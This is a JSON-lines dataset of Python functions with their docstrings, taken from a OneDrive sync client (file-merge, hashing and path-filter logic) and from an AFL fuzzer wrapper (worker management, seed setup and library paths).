{"docstring": "\"\"\"\n:param onedrivesdk.model.item.Item remote_item:\n:param onedrived.od_repo.ItemRecord item_record:\n:param posix.stat_result | None item_stat:\n:param str item_local_abspath:\n:param [str] all_local_items:\n\"\"\"\n# In this case we have all three pieces of information -- remote item metadata, database record, and local inode\n# stats. The best case is that all of them agree, and the worst case is that they all disagree.\n\n", "func_signal": "def _handle_remote_file_with_record(self, remote_item, item_record, item_stat, item_local_abspath, all_local_items):\n", "code": "if os.path.isdir(item_local_abspath):\n    # Remote item is a file yet the local item is a folder.\n    if item_record and item_record.type == ItemRecordType.FOLDER:\n        # TODO: Use the logic in handle_local_folder to solve this.\n        send2trash(item_local_abspath)\n        self.repo.delete_item(remote_item.name, self.rel_path, True)\n    else:\n        # When db record does not exist or says the path is a file, then it does not agree with local inode\n        # and the information is useless. We delete it and sync both remote and local items.\n        if item_record:\n            self.repo.delete_item(remote_item.name, self.rel_path, False)\n    return self._handle_remote_file_without_record(remote_item, None, item_local_abspath, all_local_items)\n\nremote_mtime, _ = get_item_modified_datetime(remote_item)\nlocal_mtime_ts = item_stat.st_mtime if item_stat else None\nremote_mtime_ts = datetime_to_timestamp(remote_mtime)\nrecord_mtime_ts = datetime_to_timestamp(item_record.modified_time)\ntry:\n    remote_sha1_hash = remote_item.file.hashes.sha1_hash\nexcept AttributeError:\n    remote_sha1_hash = None\n\nif (remote_item.id == item_record.item_id and remote_item.c_tag == item_record.c_tag or\n    remote_item.size == item_record.size and\n        diff_timestamps(remote_mtime_ts, record_mtime_ts) == 0):\n    # The remote item metadata matches the database record. So this item has been synced before.\n    if item_stat is None:\n        # The local file was synced but now is gone. Delete remote one as well.\n        logging.debug('Local file \"%s\" is gone but remote item matches db record. Delete remote item.',\n                      item_local_abspath)\n        self.task_pool.add_task(delete_item.DeleteRemoteItemTask(\n            self.repo, self.task_pool, self.rel_path, remote_item.name, remote_item.id, False))\n    elif (item_stat.st_size == item_record.size_local and\n          (diff_timestamps(local_mtime_ts, record_mtime_ts) == 0 or\n           remote_sha1_hash and remote_sha1_hash == sha1_value(item_local_abspath))):\n        # If the local file matches the database record (i.e., same mtime timestamp or same content),\n        # simply return. This is the best case.\n        if diff_timestamps(local_mtime_ts, remote_mtime_ts) != 0:\n            logging.info('File \"%s\" seems to have same content but different timestamp (%f, %f). Fix it.',\n                         item_local_abspath, local_mtime_ts, remote_mtime_ts)\n            fix_owner_and_timestamp(item_local_abspath, self.repo.context.user_uid, remote_mtime_ts)\n            self.repo.update_item(remote_item, self.rel_path, item_stat.st_size)\n    else:\n        # Content of local file has changed. Because we assume the remote item was synced before, we overwrite\n        # the remote item with local one.\n        # API Issue: size field may not match file size.\n        # Refer to https://github.com/OneDrive/onedrive-sdk-python/issues/88\n        # Workaround -- storing both remote and local sizes.\n        logging.debug('File \"%s\" was changed locally and the remote version is known old. Upload it.',\n                      item_local_abspath)\n        self.task_pool.add_task(upload_file.UploadFileTask(\n            self.repo, self.task_pool, self.item_request, self.rel_path, remote_item.name))\nelse:\n    # The remote file metadata and database record disagree.\n    if item_stat is None:\n        # If the remote file is the one on record, then the remote one is newer than the deleted local file\n        # so it should be downloaded. If they are not the same, then the remote one should definitely\n        # be kept. So the remote file needs to be kept and downloaded anyway.\n        logging.debug('Local file \"%s\" is gone but remote item disagrees with db record. Download it.',\n                      item_local_abspath)\n        self.task_pool.add_task(\n            download_file.DownloadFileTask(self.repo, self.task_pool, remote_item, self.rel_path))\n    elif item_stat.st_size == item_record.size_local and \\\n            (diff_timestamps(local_mtime_ts, record_mtime_ts) == 0 or\n             item_record.sha1_hash and item_record.sha1_hash == sha1_value(item_local_abspath)):\n        # Local file agrees with database record. This means that the remote file is strictly newer.\n        # The local file can be safely overwritten.\n        logging.debug('Local file \"%s\" agrees with db record but remote item is different. Overwrite local.',\n                      item_local_abspath)\n        self.task_pool.add_task(\n            download_file.DownloadFileTask(self.repo, self.task_pool, remote_item, self.rel_path))\n    else:\n        # So both the local file and remote file have been changed after the record was created.\n        equal_ts = diff_timestamps(local_mtime_ts, remote_mtime_ts) == 0\n        if (item_stat.st_size == remote_item.size and (\n                (equal_ts or remote_sha1_hash and remote_sha1_hash == sha1_value(item_local_abspath)))):\n            # Fortunately the two files seem to be the same.\n            # Here the logic is written as if there is no size mismatch issue.\n            logging.debug(\n                'Local file \"%s\" seems to have same content with remote but record disagrees. Fix db record.',\n                item_local_abspath)\n            if not equal_ts:\n                fix_owner_and_timestamp(item_local_abspath, self.repo.context.user_uid, remote_mtime_ts)\n            self.repo.update_item(remote_item, self.rel_path, item_stat.st_size)\n        else:\n            # Worst case we keep both files.\n            logging.debug('Local file \"%s\" differs from db record and remote item. Keep both versions.',\n                          item_local_abspath)\n            self._rename_local_and_download_remote(remote_item, all_local_items)", "path": "onedrived\\od_tasks\\merge_dir.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "\"\"\"\n:param onedrivesdk.model.item.Item remote_item:\n:param [str] all_local_items:\n:param dict(str, onedrived.od_repo.ItemRecord) all_records:\n\"\"\"\n# So we have three pieces of information -- the remote item metadata, the record in database, and the inode\n# on local file system. For the case of handling a remote item, the last two may be missing.\n", "func_signal": "def _handle_remote_item(self, remote_item, all_local_items, all_records):\n", "code": "item_local_abspath = self.local_abspath + '/' + remote_item.name\nrecord = all_records.pop(remote_item.name, None)\n\ntry:\n    stat = get_os_stat(item_local_abspath)\nexcept OSError as e:\n    logging.error('Error occurred when accessing path \"%s\": %s.', item_local_abspath, e)\n    return\n\nif remote_item.folder is not None:\n    return self._handle_remote_folder(remote_item, item_local_abspath, record, all_local_items)\n\nif remote_item.file is None:\n    if stat:\n        logging.info('Remote item \"%s/%s\" is neither a file nor a directory yet local counterpart exists. '\n                     'Rename local item.', self.rel_path, remote_item.name)\n        try:\n            new_name = rename_with_suffix(self.local_abspath, remote_item.name, self.repo.context.host_name)\n            all_local_items.add(new_name)\n        except OSError as e:\n            logging.error('Error renaming \"%s/%s\": %s. Skip this item due to unsolvable type conflict.',\n                          self.rel_path, remote_item.name, e)\n    else:\n        logging.info('Remote item \"%s/%s\" is neither a file nor a directory. Skip it.',\n                     self.rel_path, remote_item.name)\n    return\n\nif record is None:\n    self._handle_remote_file_without_record(remote_item, stat, item_local_abspath, all_local_items)\nelse:\n    self._handle_remote_file_with_record(remote_item, record, stat, item_local_abspath, all_local_items)", "path": "onedrived\\od_tasks\\merge_dir.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "\"\"\"\nList all names under the task local directory.\nTry resolving naming conflict (same name case-INsensitive) as it goes.\n:return [str]: A list of entry names.\n\"\"\"\n# TODO: This logic can be improved if remote info is provided.\n", "func_signal": "def list_local_names(self):\n", "code": "ents_orig = os.listdir(self.local_abspath)\nents_lower = [s.lower() for s in ents_orig]\nents_lower_uniq = set(ents_lower)\nif len(ents_orig) == len(ents_lower_uniq):\n    return set(ents_orig)\nents_ret = set()\nents_ret_lower = set()\nfor ent, ent_lower in zip(ents_orig, ents_lower):\n    ent_abspath = self.local_abspath + '/' + ent\n    if ent_lower in ents_ret_lower:\n        ent_name, ent_ext = os.path.splitext(ent)\n        count = 1\n        new_ent = ent_name + ' ' + str(count) + ent_ext\n        new_ent_lower = new_ent.lower()\n        while new_ent_lower in ents_ret_lower or new_ent_lower in ents_lower_uniq:\n            count += 1\n            new_ent = ent_name + ' ' + str(count) + ent_ext\n            new_ent_lower = new_ent.lower()\n        try:\n            shutil.move(ent_abspath, self.local_abspath + '/' + new_ent)\n            ents_ret.add(new_ent)\n            ents_ret_lower.add(new_ent_lower)\n        except (IOError, OSError) as e:\n            logging.error('Error occurred when solving name conflict of \"%s\": %s.', ent_abspath, e)\n            continue\n    else:\n        ents_ret.add(ent)\n        ents_ret_lower.add(ent_lower)\nreturn ents_ret", "path": "onedrived\\od_tasks\\merge_dir.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "\"\"\"\n:param onedrived.od_repo.OneDriveLocalRepository repo:\n:param onedrived.od_task.TaskPool task_pool:\n:param str item_name:\n:param str parent_relpath:\n:param True | False upload_if_success:\n:param True | False abort_if_local_gone:\n\"\"\"\n", "func_signal": "def __init__(self, repo, task_pool, item_name, parent_relpath, upload_if_success=True, abort_if_local_gone=True):\n", "code": "super().__init__(repo, task_pool)\nself.item_name = item_name\nself.parent_relpath = parent_relpath\nself.local_abspath = repo.local_root + parent_relpath + '/' + item_name\nself.upload_if_success = upload_if_success\nself.abort_if_local_gone = abort_if_local_gone", "path": "onedrived\\od_tasks\\merge_dir.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "\"\"\"\n:param str item_name:\n:param onedrived.od_repo.ItemRecord | None item_record:\n:param posix.stat_result | None item_stat:\n:param str item_local_abspath:\n\"\"\"\n", "func_signal": "def _handle_local_file(self, item_name, item_record, item_stat, item_local_abspath):\n", "code": "if self.repo.path_filter.should_ignore(self.rel_path + '/' + item_name, False):\n    logging.debug('Ignored local file \"%s/%s\".', self.rel_path, item_name)\n    return\n\nif item_stat is None:\n    logging.info('Local-only file \"%s\" existed when scanning but is now gone. Skip it.', item_local_abspath)\n    if item_record is not None:\n        self.repo.delete_item(item_record.item_name, item_record.parent_path, False)\n        if self.assume_remote_unchanged:\n            self.task_pool.add_task(delete_item.DeleteRemoteItemTask(\n                repo=self.repo, task_pool=self.task_pool, parent_relpath=self.rel_path,\n                item_name=item_name, item_id=item_record.item_id, is_folder=False))\n    return\n\nif item_record is not None and item_record.type == ItemRecordType.FILE:\n    record_ts = datetime_to_timestamp(item_record.modified_time)\n    equal_ts = diff_timestamps(item_stat.st_mtime, record_ts) == 0\n    if item_stat.st_size == item_record.size_local and \\\n            (equal_ts or item_record.sha1_hash and item_record.sha1_hash == sha1_value(item_local_abspath)):\n        # Local file matches record.\n        if self.assume_remote_unchanged:\n            if not equal_ts:\n                fix_owner_and_timestamp(item_local_abspath, self.repo.context.user_uid, record_ts)\n        else:\n            logging.debug('Local file \"%s\" used to exist remotely but not found. Delete it.',\n                          item_local_abspath)\n            send2trash(item_local_abspath)\n            self.repo.delete_item(item_record.item_name, item_record.parent_path, False)\n        return\n    logging.debug('Local file \"%s\" is different from when it was last synced. Upload it.', item_local_abspath)\nelif item_record is not None:\n    # Record is a dir but local entry is a file.\n    if self.assume_remote_unchanged:\n        logging.info('Remote item for local file \"%s\" is a directory that has been deleted locally. '\n                     'Delete the remote item and upload the file.', item_local_abspath)\n        if not delete_item.DeleteRemoteItemTask(\n                repo=self.repo, task_pool=self.task_pool, parent_relpath=self.rel_path,\n                item_name=item_name, item_id=item_record.item_id, is_folder=True).handle():\n            logging.error('Failed to delete outdated remote directory \"%s/%s\" of Drive %s.',\n                          self.rel_path, item_name, self.repo.drive.id)\n            # Keep the record so that the branch can be revisited next time.\n            return\n    logging.debug('Local file \"%s\" is new to OneDrive. Upload it.', item_local_abspath)\n\nself.task_pool.add_task(upload_file.UploadFileTask(\n    self.repo, self.task_pool, self.item_request, self.rel_path, item_name))", "path": "onedrived\\od_tasks\\merge_dir.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "\"\"\"\n:param onedrived.od_task.TaskPool task_pool:\n\"\"\"\n", "func_signal": "def __init__(self, name, task_pool):\n", "code": "super().__init__(name=name, daemon=False)\nself.task_pool = task_pool\nself._running = True", "path": "onedrived\\od_threads.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "\"\"\"\n:param [str] lang_resources: List of language resource files to load.\n    Example: ['od_pref', 'configurator'] to load lang/od_pref\n:param str locale_str: Locale to load.\n\"\"\"\n", "func_signal": "def __init__(self, lang_resources, locale_str='en_US'):\n", "code": "self.string_resources = dict()\nfor lang in lang_resources:\n    try:\n        t = get_resource('lang/%s.%s.json' % (lang, locale_str), pkg_name='onedrived')\n    except FileNotFoundError:\n        t = get_resource('lang/%s.%s.json' % (lang, self.DEFAULT_LOCALE), pkg_name='onedrived')\n    data = json.loads(t)\n    self.string_resources.update(data)", "path": "onedrived\\od_i18n.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "\"\"\"\n:param asyncio.AbstractEventLoop | None loop:\n\"\"\"\n# Information about host and user.\n", "func_signal": "def __init__(self, loop):\n", "code": "self.host_name = os.uname()[1]\nself.user_name = get_login_username()\nself.user_uid = getpwnam(self.user_name).pw_uid\nself.user_home = os.path.expanduser('~' + self.user_name)\nself.config_dir = click.get_app_dir('onedrived')\nself._create_config_dir_if_missing()\nself.config = self.DEFAULT_CONFIG\nself.loop = loop\nself._watcher = None", "path": "onedrived\\od_context.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "\"\"\"\n:param str item_name:\n:param dict(str, onedrived.od_repo.ItemRecord) all_records:\n:return:\n\"\"\"\n", "func_signal": "def _handle_local_item(self, item_name, all_records):\n", "code": "item_local_abspath = self.local_abspath + '/' + item_name\nrecord = all_records.pop(item_name, None)\ntry:\n    if os.path.isfile(item_local_abspath):\n        # stat can be None because the function can be called long after dir is listed.\n        stat = get_os_stat(item_local_abspath)\n        self._handle_local_file(item_name, record, stat, item_local_abspath)\n    elif os.path.isdir(item_local_abspath):\n        self._handle_local_folder(item_name, record, item_local_abspath)\n    else:\n        logging.warning('Unsupported type of local item \"%s\". Skip it and remove record.', item_local_abspath)\n        if record is not None:\n            self.repo.delete_item(record.item_name, record.parent_path, record.type == ItemRecordType.FOLDER)\nexcept OSError as e:\n    logging.error('Error occurred when accessing path \"%s\": %s.', item_local_abspath, e)", "path": "onedrived\\od_tasks\\merge_dir.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "\"\"\"\n:param onedrived.od_repo.OneDriveLocalRepository | None repo:\n:param onedrived.od_task.TaskPool task_pool:\n\"\"\"\n", "func_signal": "def __init__(self, repo, task_pool):\n", "code": "self.repo = repo\nself.task_pool = task_pool", "path": "onedrived\\od_tasks\\base.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "\"\"\"\nInitialize the filter with a list of (case-INsensitive) gitignore rules.\n:param [str] rules: List of gitignore rules.\n\"\"\"\n", "func_signal": "def __init__(self, rules):\n", "code": "super().__init__(rules, ignore_case=True)\nself.add_patterns((self.TMP_PREFIX + '*' + self.TMP_SUFFIX, '*[<>?*:\"|]*', '.*'))", "path": "onedrived\\od_models\\path_filter.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "\"\"\"\nHandle the case in which a remote item is not found in the database. The local item may or may not exist.\n:param onedrivesdk.model.item.Item remote_item:\n:param posix.stat_result | None item_stat:\n:param str item_local_abspath:\n:param [str] all_local_items:\n\"\"\"\n", "func_signal": "def _handle_remote_file_without_record(self, remote_item, item_stat, item_local_abspath, all_local_items):\n", "code": "if item_stat is None:\n    # The file does not exist locally, and there is no record in database. The safest approach is probably\n    # download the file and update record.\n    self.task_pool.add_task(\n        download_file.DownloadFileTask(self.repo, self.task_pool, remote_item, self.rel_path))\nelif os.path.isdir(item_local_abspath):\n    # Remote path is file yet local path is a dir.\n    logging.info('Path \"%s\" is a folder yet the remote item is a file. Keep both.', item_local_abspath)\n    self._rename_local_and_download_remote(remote_item, all_local_items)\nelse:\n    # We first compare timestamp and size -- if both properties match then we think the items are identical\n    # and just update the database record. Otherwise if sizes are equal, we calculate hash of local item to\n    # determine if they are the same. If so we update timestamp of local item and update database record.\n    # If the remote item has different hash, then we rename the local one and download the remote one so that no\n    # information is lost.\n    remote_mtime, remote_mtime_w = get_item_modified_datetime(remote_item)\n    remote_mtime_ts = datetime_to_timestamp(remote_mtime)\n    equal_ts = diff_timestamps(remote_mtime_ts, item_stat.st_mtime) == 0\n    equal_attr = remote_item.size == item_stat.st_size and equal_ts\n    # Because of the size mismatch issue, we can't use size not being equal as a shortcut for hash not being\n    # equal. When the bug is fixed we can do it.\n    if equal_attr or hash_match(item_local_abspath, remote_item):\n        if not equal_ts:\n            logging.info('Local file \"%s\" has same content but wrong timestamp. '\n                         'Remote: mtime=%s, w=%s, ts=%s, size=%d. '\n                         'Local: ts=%s, size=%d. Fix it.',\n                         item_local_abspath,\n                         remote_mtime, remote_mtime_w, remote_mtime_ts, remote_item.size,\n                         item_stat.st_mtime, item_stat.st_size)\n            fix_owner_and_timestamp(item_local_abspath, self.repo.context.user_uid, remote_mtime_ts)\n        self.repo.update_item(remote_item, self.rel_path, item_stat.st_size)\n    else:\n        self._rename_local_and_download_remote(remote_item, all_local_items)", "path": "onedrived\\od_tasks\\merge_dir.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "\"\"\"\n:param onedrived.od_repo.OneDriveLocalRepository repo:\n:param onedrived.od_task.TaskPool task_pool:\n:param str parent_relpath:\n:param str item_name:\n:param str | None item_id:\n:param True | False is_folder:\n\"\"\"\n", "func_signal": "def __init__(self, repo, task_pool, parent_relpath, item_name, item_id=None, is_folder=False):\n", "code": "super().__init__(repo=repo, task_pool=task_pool, parent_relpath=parent_relpath,\n                 item_name=item_name, item_id=item_id, is_folder=is_folder)", "path": "onedrived\\od_tasks\\delete_item.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "\"\"\"\n:param str item_name:\n:param onedrived.od_repo.ItemRecord | None item_record:\n:param str item_local_abspath:\n\"\"\"\n", "func_signal": "def _handle_local_folder(self, item_name, item_record, item_local_abspath):\n", "code": "if not self.deep_merge:\n    return\n\nif self.repo.path_filter.should_ignore(self.rel_path + '/' + item_name, True):\n    logging.debug('Ignored local directory \"%s/%s\".', self.rel_path, item_name)\n    return\n\nif item_record is not None and item_record.type == ItemRecordType.FOLDER:\n    if self.assume_remote_unchanged:\n        rel_path = self.rel_path + '/' + item_name\n        self.task_pool.add_task(MergeDirectoryTask(\n            repo=self.repo, task_pool=self.task_pool, rel_path=rel_path,\n            item_request=self.repo.authenticator.client.item(drive=self.repo.drive.id, path=rel_path),\n            assume_remote_unchanged=True, parent_remote_unchanged=self.assume_remote_unchanged))\n    else:\n        send2trash(item_local_abspath)\n        self.repo.delete_item(item_name, self.rel_path, True)\n    return\n    # try:\n    #     # If there is any file accessed after the time when the record was created, do not delete the dir.\n    #     # Instead, upload it back.\n    #     # As a note, the API will return HTTP 404 Not Found after the item was deleted. So we cannot know from\n    #     # API when the item was deleted. Otherwise this deletion time should be the timestamp to use.\n    #     # TODO: A second best timestamp is the latest timestamp of any children item under this dir.\n    #     visited_files = subprocess.check_output(\n    #         ['find', item_local_abspath, '-type', 'f',\n    #         '(', '-newermt', item_record.record_time_str, '-o',\n    #          '-newerat', item_record.record_time_str, ')', '-print'], universal_newlines=True)\n    #     if visited_files == '':\n    #         logging.info('Local item \"%s\" was deleted remotely and not used since %s. Delete it locally.',\n    #                      item_local_abspath, item_record.record_time_str)\n    #         send2trash(item_local_abspath)\n    #         self.repo.delete_item(item_name, self.rel_path, True)\n    #         return\n    #     logging.info('Local directory \"%s\" was deleted remotely but locally used. Upload it back.')\n    # except subprocess.CalledProcessError as e:\n    #     logging.error('Error enumerating files in \"%s\" accessed after \"%s\": %s.',\n    #                   item_local_abspath, item_record.record_time_str, e)\n    # except OSError as e:\n    #     logging.error('Error checking local folder \"%s\": %s.', item_local_abspath, e)\nelif item_record is not None:\n    if self.assume_remote_unchanged:\n        logging.info('Remote item for local dir \"%s\" is a file that has been deleted locally. '\n                     'Delete the remote item and upload the file.', item_local_abspath)\n        if not delete_item.DeleteRemoteItemTask(\n                repo=self.repo, task_pool=self.task_pool, parent_relpath=self.rel_path,\n                item_name=item_name, item_id=item_record.item_id, is_folder=False).handle():\n            logging.error('Failed to delete outdated remote directory \"%s/%s\" of Drive %s.',\n                          self.rel_path, item_name, self.repo.drive.id)\n            # Keep the record so that the branch can be revisited next time.\n            return\n\n# Either we decide to upload the item above, or the folder does not exist remotely and we have no reference\n# whether it existed remotely or not in the past. Better upload it back.\nlogging.info('Local directory \"%s\" seems new. Upload it.', item_local_abspath)\nself.task_pool.add_task(CreateFolderTask(\n    self.repo, self.task_pool, item_name, self.rel_path, True, True))", "path": "onedrived\\od_tasks\\merge_dir.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "\"\"\"\nDetermine if a path should be ignored.\n:param str path: Path relative to repository root.\n:param True | False is_dir: Whether or not the path is a folder.\n:return True | False: Whether or not the path should be ignored.\n\"\"\"\n", "func_signal": "def should_ignore(self, path, is_dir=False):\n", "code": "if path[-1] == '/':\n    is_dir = True\nreturn self.is_ignored(path, is_directory=is_dir)", "path": "onedrived\\od_models\\path_filter.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "\"\"\"\n:return (str, int):\n\"\"\"\n", "func_signal": "def _find_ngrok_inspection_port(self):\n", "code": "for c in psutil.Process(self.ngrok_proc.pid).connections():\n    if c.laddr[0] == '127.0.0.1' and c.raddr == () and c.status == psutil.CONN_LISTEN:\n        return c.laddr\nraise RuntimeError('Did not find API interface of ngrok.')", "path": "onedrived\\od_webhooks\\ngrok_server.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "\"\"\"\n:param str local_abspath:\n:param onedrivesdk.model.item.Item remote_item:\n:return True | False:\n\"\"\"\n", "func_signal": "def hash_match(local_abspath, remote_item):\n", "code": "file_facet = remote_item.file\nif file_facet:\n    hash_facet = file_facet.hashes\n    if hash_facet:\n        return hash_facet.sha1_hash and hash_facet.sha1_hash == sha1_value(local_abspath)\nreturn False", "path": "onedrived\\od_hashutils.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "# If allow for sudo, prepend SUDO_USER.\n", "func_signal": "def get_login_username():\n", "code": "for key in ('LOGNAME', 'USER', 'LNAME', 'USERNAME'):\n    s = os.getenv(key)\n    if not is_invalid_username(s):\n        return s\nraise ValueError('Cannot find login name of current user.')", "path": "onedrived\\od_context.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "\"\"\"\nCalculate the MD5 or SHA hash value of the data of the specified file.\n:param str file_path:\n:param int block_size:\n:return str:\n\"\"\"\n", "func_signal": "def sha1_value(file_path, block_size=2 << 22):\n", "code": "alg = hashlib.sha1()\nwith open(file_path, 'rb') as f:\n    data = f.read(block_size)\n    while len(data):\n        alg.update(data)\n        data = f.read(block_size)\nreturn alg.hexdigest().upper()", "path": "onedrived\\od_hashutils.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "\"\"\"\nReturn a string for Quota object.\n:param onedrivesdk.model.Quota q:\n:return:\n\"\"\"\n", "func_signal": "def quota_short_str(q):\n", "code": "return translator['api.drive.quota.short_format'].format(\n    used=pretty_api.pretty_print_bytes(q.used, precision=1),\n    total=pretty_api.pretty_print_bytes(q.total, precision=1))", "path": "onedrived\\od_pref.py", "repo_name": "xybu/onedrived-dev", "stars": 709, "license": "mit", "language": "python", "size": 221}
{"docstring": "'''\nstart fuzzing\n'''\n\n# spin up the AFL workers\n", "func_signal": "def start(self):\n", "code": "self._start_afl()\n\n# start the callback timer\nself._timer.start()\n\nself._on = True", "path": "fuzzer\\fuzzer.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "'''\nexport the correct library path for a given architecture\n'''\n", "func_signal": "def _export_library_path(self, p):\n", "code": "path = None\n\nif self.library_path is None:\n    directory = None\n    if p.arch.qemu_name == \"aarch64\":\n        directory = \"arm64\"\n    if p.arch.qemu_name == \"i386\":\n        directory = \"i386\"\n    if p.arch.qemu_name == \"x86_64\":\n        directory = \"x86_64\"\n    if p.arch.qemu_name == \"mips\":\n        directory = \"mips\"\n    if p.arch.qemu_name == \"mipsel\":\n        directory = \"mipsel\"\n    if p.arch.qemu_name == \"ppc\":\n        directory = \"powerpc\"\n    if p.arch.qemu_name == \"arm\":\n        # some stuff qira uses to determine the which libs to use for arm\n        with open(self.binary_path, \"rb\") as f: progdata = f.read(0x800)\n        if \"/lib/ld-linux.so.3\" in progdata:\n            directory = \"armel\"\n        elif \"/lib/ld-linux-armhf.so.3\" in progdata:\n            directory = \"armhf\"\n\n    if directory is None:\n        l.warning(\"architecture \\\"%s\\\" has no installed libraries\", p.arch.qemu_name)\n    else:\n        path = os.path.join(self.afl_dir, \"..\", \"fuzzer-libs\", directory)\nelse:\n    path = self.library_path\n\nif path is not None:\n    l.debug(\"exporting QEMU_LD_PREFIX of '%s'\", path)\n    os.environ['QEMU_LD_PREFIX'] = path", "path": "fuzzer\\fuzzer.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "\"\"\"\nReturn the origins of this seed.\n\"\"\"\n", "func_signal": "def origins(self, follow_extensions=False):\n", "code": "if self._origins is not None:\n    return self._origins\n\nif not follow_extensions and not self.instance.startswith('fuzzer-'):\n    o = { self }\nelif not self.sources:\n    o = { self }\nelse:\n    o = set.union(*(s.origins for s in self.sources))\nself._origins = o\nreturn self._origins", "path": "fuzzer\\hierarchy.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "'''\nremove multiple fuzzers\n'''\n\n", "func_signal": "def remove_fuzzers(self, n):\n", "code": "if n > len(self.procs):\n    l.error(\"not more than %u fuzzers to remove\", n)\n    raise ValueError(\"not more than %u fuzzers to remove\" % n)\n\nif n == len(self.procs):\n    l.warning(\"removing all fuzzers\")\n\nfor _ in range(n):\n    self.remove_fuzzer()", "path": "fuzzer\\fuzzer.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "\"\"\"\nGet coverage and crashes by technique.\n\"\"\"\n", "func_signal": "def technique_contributions(self):\n", "code": "results = { }\nfor s,(b,c) in self.seed_contributions():\n    results.setdefault(s.instance.split('-')[0], [0,0])[0] += b\n    results.setdefault(s.instance.split('-')[0], [0,0])[1] += c\nreturn results", "path": "fuzzer\\hierarchy.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "'''\ntest dictionary creation on a binary\n'''\n\n", "func_signal": "def test_dictionary_creation_cgc():\n", "code": "binary = os.path.join(bin_location, \"tests/cgc/ccf3d301_01\")\nout_dict = tempfile.mktemp(prefix='fuzztest', dir='/tmp')\n\nargs = [os.path.join(fuzzer_bin, 'create_dict.py'), binary]\n\nwith open(out_dict, \"wb\") as f:\n    p = subprocess.Popen(args, stdout=f)\n\nretcode = p.wait()\n\nnose.tools.assert_equal(retcode, 0)\n\ndict_data = open(out_dict).read()\nos.remove(out_dict)\n\ndefinitions = dict_data.split(\"\\n\")\n\n# assert we find just as definitions\nnose.tools.assert_true(len(definitions) >= 60)", "path": "tests\\test_fuzzer.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "'''\npopulate the input directory with the seeds specified\n'''\n\n", "func_signal": "def _initialize_seeds(self):\n", "code": "assert len(self.seeds) > 0, \"Must specify at least one seed to start fuzzing with\"\n\nl.debug(\"initializing seeds %r\", self.seeds)\n\ntemplate = os.path.join(self.in_dir, \"seed-%d\")\nfor i, seed in enumerate(self.seeds):\n    with open(template % i, \"wb\") as f:\n        f.write(seed)", "path": "fuzzer\\fuzzer.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "'''\nremove one fuzzer\n'''\n\n", "func_signal": "def remove_fuzzer(self):\n", "code": "try:\n    f = self.procs.pop()\nexcept IndexError:\n    l.error(\"no fuzzer to remove\")\n    raise ValueError(\"no fuzzer to remove\")\n\nf.kill()", "path": "fuzzer\\fuzzer.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "'''\nfind the directory containing bin, there should always be a directory\ncontaining bin below base intially\n'''\n", "func_signal": "def _get_base():\n", "code": "base = os.path.dirname(__file__)\n\nwhile not \"bin\" in os.listdir(base) and os.path.abspath(base) != \"/\":\n    base = os.path.join(base, \"..\")\n\nif os.path.abspath(base) == \"/\":\n    raise InstallError(\"could not find afl install directory\")\n\nreturn base", "path": "fuzzer\\fuzzer.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
